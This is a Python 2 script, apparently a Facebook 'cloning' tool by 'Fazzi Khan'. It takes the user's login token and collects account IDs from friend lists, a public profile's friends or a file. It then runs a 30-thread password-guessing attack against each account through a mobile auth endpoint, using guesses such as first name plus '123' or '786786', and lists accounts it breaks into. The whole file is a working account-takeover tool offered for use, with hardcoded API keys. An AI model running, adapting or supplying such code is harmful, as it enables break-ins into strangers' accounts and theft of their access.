#!/usr/bin/python2

#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib

from multiprocessing.pool import ThreadPool

try:

    import requests

except ImportError:

    os.system('pip2 install requests')

try:

    import mechanize

except ImportError:

    os.system('pip2 install mechanize')

    os.system('python2 Host-Baba.py')

from requests.exceptions import ConnectionError

from mechanize import Browser

#### browser ####

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#### colours ####

B='\033[1;94m'

R='\033[1;91m'

G='\033[1;92m'

W='\033[1;97m'

S='\033[1;96m'

P='\033[1;95m'

Y='\033[1;93m'

#### exit ####

def exb():

	print (R + 'Exit')	os.sys.exit()

#### clear ####

def cb():

    os.system('clear')

#### time sleep ####

def t():

    time.sleep(1)

def t1():

    time.sleep(0.01)

#### print std ####

def psb(z):

	for e in z + '\n':

		sys.stdout.write(e)

		sys.stdout.flush()

		t1()

#### token remove ####

def trb():

    os.system('rm -rf token.txt')

##### LOGO #####

logo='''

\033[1;91m--------------------------------------------------

\033[1;93m          |----------------------------|

\033[1;93m          |        W E L C O M E      |

\033[1;93m          |----------------------------|

\033[1;91m--------------------------------------------------

\033[1;91m--------------------------------------------------

\033[1;94m>>>>>>>---- WELLCOM TO FAZZI COMMMAND -----<<<<<<<<<

\033[1;91m--------------------------------------------------

\033[1;94m<<<<<-->>> WORLD FASTEST CLONING COMMAND <<<<->>>>

\033[1;91m--------------------------------------------------

\033[1;93m          |----------------------------|

\033[1;93m          |         FAZZI KHAN          |

\033[1;93m          |----------------------------|

\033[1;91m-----------------------------------------------

\033[1;93mâ•°â•¼â•¼âž£ : Page       : Fazzi Khan Official

\033[1;92mâ•°â•¼â•¼âž£ : Author     : Fazzi Khan

\033[1;94mâ•°â•¼â•¼âž£ : Programmer : Fazzi Khan

\033[1;91m-----------------------------------------------

\033[1;93m<<<<-->>>> THIS TOOL IS FREE NOT FOR SALE <<<->>>>

\033[1;91m--------------------------------------------------

\033[1;91m--------------------------------------------------

\033[1;94m<<<<------->>>> DONT COPY MY SCRIPT <<<------->>>>

\033[1;91m--------------------------------------------------

\033[1;91m--------------------------------------------------

                                '''

back=0

successfull=[]

checkpoint=[]

oks=[]

cps=[]

id=[]

#### login ####

def login():

	cb()

	try:

		tb=open('token.txt', 'r')

		menu() 

	except (KeyError,IOError):

		cb()

		print (logo)

		print (R + '>>---->>>' + S + 'LOGIN WITH FRESH OPEN ACCOUNT ' + R + '<<-----<<<')

		print

		id=raw_input(S + 'â•°â”€â•¼â•¼âž£' + S + 'ID: ' + G +'')

		pwd=getpass.getpass(S + 'â•°â”€â•¼â•¼âž£' + R + 'PASSWORD : ')

		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

		z=json.load(data)

		if 'access_token' in z:

		    st = open("token.txt", "w")

		    st.write(z["access_token"])

		    st.close()

		    print (S + '<-->' + Y + 'Congratulation Login successfull 100% âœ“')

		    os.system('xdg-open https://www.facebook.com/RE4L.H4CK3R')

		    menu()

		else:

		    if "www.facebook.com" in z["error_msg"]:

		        print (R + 'YourAccount has a checkpoint !')

		        t()

		        login()

		    else:

		        print (R + 'number/user id/ password is wrong !')

		        trb()

		        t()

		        login()

def menu():

	cb()

	try:

		tb=open('token.txt','r').read()

	except IOError:

		print (R + 'Token Invalid !')

		trb()

		t()

		login()

	try:

		otw=requests.get('https://graph.facebook.com/me?access_token='+tb)

		a=json.loads(otw.text)

	except KeyError:

		print (G + 'Account has a checkpoint !')

		trb()

		t()

		login()

	except requests.exceptions.ConnectionError:

		print (W + 'No internet connection !')

		t()

		exb()

	cb()

	print (logo)

	print (S + 'â•°â”€â•¼â•¼âž£ :' + G + 'ID NAME: ' + R + a['name'])

	print (S + 'â•°â”€â•¼â•¼âž£ :' + G + 'USER ID:' + R + a['id'])

	print

	print (S + 50*'-')

	print

	print (S + '' + P + 'â•°â”€â•¼â•¼âž£ : [{1}] :' + S + '' + S + 'START CLONING ACCOUNT....')

	print (S + '' + P + 'â•°â”€â•¼â•¼âž£ : [{2}] :' + S + '' + S + 'UPDATE THEÂ  TOOL....')

	print (S + '' + P + 'â•°â”€â•¼â•¼âž£ : [{3}] :' + S + '' + S + 'BACK TOOL ....')

	print (S + '' + Y + 'â•°â”€â•¼â•¼âž£ : [{4}] :' + S + '' + G + 'LOG OUT ....')

	print (S + '' + Y + 'â•°â”€â•¼â•¼âž£ : [{0}] :' + S + '' + R + 'EXIT ....')

	print

	print (S + 50*'-')

	print

	mb()

def mb():

	bm=raw_input(W + 'â•°â”€â•¼â•¼âž£ :')

	if bm =='':

		print (R + 'Select a valid option !')

		mb()

	elif bm =='1':

		pak()

	elif bm =='2':

	    os.system('rm -rf $HOME/FastCrack')

	    os.system('cd $HOME/FastCrack && python2 Host-Baba.py && https://github.com/Tech-Baba/FastCrack')

	    cb()

	    print (logo)

	    psb('â˜†10%')

	    psb('â˜†â˜†20%')

	    psb('â˜†â˜†â˜†30%')

	    psb('â˜†â˜†â˜†â˜†40%')

	    psb('â˜†â˜†â˜†â˜†â˜†50%')

	    psb('â˜†â˜†â˜†â˜†â˜†â˜†60%')

	    psb('â˜†â˜†â˜†â˜†â˜†â˜†â˜†70%')

	    psb('â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†80%')

	    psb('â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†90%')

	    psb('â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†100%')

	    psb('Frends login new Accountâœ“')

	    psb('Facebook Fazzi Khan')

	    psb('WellCome To Fazzi Khan')

	    psb('Congratulations Fazzi Khan Tool Has Been Updated Successfully')

	    psb('ðŸ”“User Nameâ˜† Fazziâœ“')

	    psb('ðŸ”“Password â˜† Khanâœ“')

	    psb('THIS TOOL IS IS FREE')

	    psb('Please Login Again')

	    time.sleep(2)

	    os.system('cd $HOME/FastCrack && python2 Host-Baba.py')

	elif bm =='3':

	    os.system('xdg-open https://www.facebook.com/Blackspider780')

	    menu()

	elif bm =='4':

		psb('Token Has Been Removed')

		trb()

		t()

		exb()

	elif bm =='0':

	    exb()

	else:

		print (R+'Fill in correctly !')

		mb()

def pak():

	global tb

	try:

		tb=open('token.txt','r').read()

	except IOError:

		print (R + ' Invalid Token !')

		trb()

		t()

		login()

	cb()

	print (logo)

	print (S + '' + P + 'â•°â”€â•¼â•¼âž£ : [{1}] :' + S + '' + S + 'CLONE WITH FRIEND LIST.....')

	print (S + '' + P + 'â•°â”€â•¼â•¼âž£ : [{2}] :' + S + '' + S + 'CLONE WITH PUBLIC ACCOUNT....')

	print (S + '' + P + 'â•°â”€â•¼â•¼âž£ : [{3}] :' + S + '' + S + 'CLONE WITH YOUR FILE....')

	print (S + '' + P + 'â•°â”€â•¼â•¼âž£ : [{0}] :' + S + ' ' + S + 'EXIT....')

	print

	print (S + 50*'-')

	print

	pb()

def pb():

	bp=raw_input(W + 'â•°â”€â•¼â•¼âž£ : ')

	if bp =='':

		print (R + 'Select a valid option !')

		pb()

	elif bp =='1':

		cb()

		print (logo)

		r=requests.get('https://graph.facebook.com/me/friends?access_token='+tb)

		z=json.loads(r.text)

		for s in z['data']:

			id.append(s['id'])

	elif bp=='2':

		cb()

		print (logo)

		idt=raw_input(S + 'â•°â”€â•¼â•¼âž£' + G + 'PUT PUBLIC USER ID/USER NAME: ' + W + '')

		cb()

		print (logo)

		try:

			jok=requests.get('https://graph.facebook.com/'+idt+'?access_token='+tb)

			op=json.loads(jok.text)

			psb(S + 'â•°â”€â•¼â•¼âž£' + G + 'ACCOUNT NAME : ' + W + op['name'])

		except KeyError:

			print (R + '<<--->>> ID NOT FOUND !')

			raw_input(R + 'â•°â”€â•¼â•¼âž£ BACK: ')

			pak()

		r=requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+tb)

		z=json.loads(r.text)

		for i in z['data']:

			id.append(i['id'])

	elif bp =='3':

		cb()

		print (logo)

		try:

			idlist=raw_input(S + 'â•°â”€â•¼â•¼âž£ ' + R + 'ENTER FILE PATH : ' + G + '')

			for line in open(idlist,'r').readlines():

				id.append(line.strip())

		except IOError:

			print (R + '<<--->> FILE NOT FOUND !')

			raw_input(R + 'â•°â”€â•¼â•¼âž£ BACK :')

			pak()

	elif bp =='0':

		menu()

	else:

		print (R + ' Select a valid option !')

		pb()

	print (S + 'â•°â”€â•¼â•¼âž£' + P + ' TOTAL FRIEND LIST : ' + W + str(len(id)))

	psb(S + 'â•°â”€â•¼â•¼âž£' + S + 'TO STOP  PROCESS TYPE CTRL Z')

	print

	print (S + 50*'-')

	print

	def main(arg):

		global cps, oks

		user=arg

		try:

			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)

			j=json.loads(h.text)

			ps1=('786786')

			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

			k=json.load(dt)

			if 'www.facebook.com' in k['error_msg']:

			    print(S+'[{TECH-BABA-CP}] '+user+' '+ps1)

			    cps.append(user+ps1)

			else:

			    if 'access_token' in k:

			        print (G+'[{TECH-BABA-OK}] '+user+' '+ps1)

			        oks.append(user+ps1)

			    else:

			        ps2=(j['first_name']+'123')

			        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

			        k=json.load(dt)

			        if 'www.facebook.com' in k['error_msg']:

			            print(S+'[{Fazzi-Khan-CP}] '+user+' '+ps2)

			            cps.append(user+ps2)

			        else:

			            if 'access_token' in k:

			                print(G+'[{Fazzi-Khan-OK}]  '+user+' '+ps2)

			                oks.append(user+ps2)

			            else:

			                ps3=(j['first_name']+'1234')

			                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

			                k=json.load(dt)

			                if 'www.facebook.com' in k['error_msg']:

			                    print(S+'[{Fazzi-Khan-CP}] '+user+' '+ps3)

			                    cps.append(user+ps3)

			                else:

			                    if 'access_token' in k:

			                        print(G+'[{Fazzi-Khan-OK}] '+user+' '+ps3)

			                        oks.append(user+ps3)

			                    else:

			                        ps4=(j['first_name']+'12345')

			                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps4)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

			                        k=json.load(dt)

			                        if 'www.facebook.com' in k['error_msg']:

			                            print(S+'[{Fazzi-Khan-CP}] '+user+' '+ps4)

			                            cps.append(user+ps4)

			                        else:

			                            if 'access_token' in k:

			                                print(G+'[{Fazzi-Khan-OK}] '+user+' '+ps4)

			                                oks.append(user+ps4)

			                            else:

			                                ps5=('Pakistan')

			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

			                                k=json.load(dt)

			                                if 'www.facebook.com' in k['error_msg']:

			                                    print(S+'[{Fazzi-Khan-CP}] '+user+' '+ps5)

			                                    cps.append(user+ps5)

			                                else:

			                                    if 'access_token' in k:

			                                        print(G+'[{Fazzi-Khan-OK}] '+user+' '+ps5)

			                                        oks.append(user+ps5)

			                                    else:

			                                        ps6=('223344')

			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

			                                        k=json.load(dt)

			                                        if 'www.facebook.com' in k['error_msg']:

			                                            print(S+'[{Fazzi-Khan-CP}] '+user+' '+ps6)

			                                            cps.append(user+ps6)

			                                        else:

			                                            if 'access_token' in k:

			                                                print(G+'[{Fazzi-Khan-OK}] '+user+' '+ps6)

			                                                oks.append(user+ps6)

		except:

			pass

	p=ThreadPool(30)

	p.map(main, id)

	print

	print(S+50*'-')

	print

	print(S+'Process has been completed CP ID Open After 7 Days ')

	print(Y+'Total '+G+'OK'+S+'/'+P+'CP'+S+' = '+G+str(len(oks))+S+'/'+R+str(len(cps)))

	print(S+'Fazzi Khan')     

	print

	raw_input(R + 'Back')

	os.system('python2 Host-Baba.py')

if __name__=='__main__':

    login()
